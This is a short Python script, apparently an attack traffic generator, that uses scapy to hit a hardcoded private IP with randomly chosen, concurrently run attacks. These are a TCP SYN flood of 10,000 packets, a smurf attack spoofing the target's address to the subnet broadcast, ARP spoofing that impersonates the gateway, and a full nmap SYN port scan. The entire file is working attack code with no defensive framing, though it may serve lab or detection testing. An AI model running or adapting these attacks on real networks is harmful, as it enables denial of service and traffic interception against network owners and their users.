import os
import random
import threading
import scapy.all as scapy
from scapy.all import IP, ICMP, TCP, RandShort, send

target_ip = "192.168.201.44"

def dos_attack():
    packet = IP(dst=target_ip)/TCP(dport=80, sport=RandShort(), flags="S")
    send(packet, count=10000, verbose=False)

def smurf_attack():
    broadcast_ip = "192.168.201.255"
    packet = IP(src=target_ip, dst=broadcast_ip)/ICMP()
    send(packet, count=10000, verbose=False)

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast / arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc if answer else None

def arp_spoof():
    spoofed_ip = "192.168.201.1"
    mac = get_target_mac(target_ip)
    if mac:
        packet = scapy.Ether(dst=mac) / scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
        scapy.sendp(packet, verbose=False)

def nmap_scan():
    os.system(f"nmap -sS -p- {target_ip}")

def run_random_attacks():
    attacks = [dos_attack, smurf_attack, arp_spoof, nmap_scan]
    
    # اختيار عدد عشوائي من الهجمات بين 2 و 4
    num_attacks = random.randint(2, 4)
    
    # اختيار الهجمات العشوائية
    selected_attacks = random.sample(attacks, num_attacks)
    
    threads = []
    
    for attack in selected_attacks:
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()
    
    # انتظار انتهاء جميع الهجمات
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    run_random_attacks()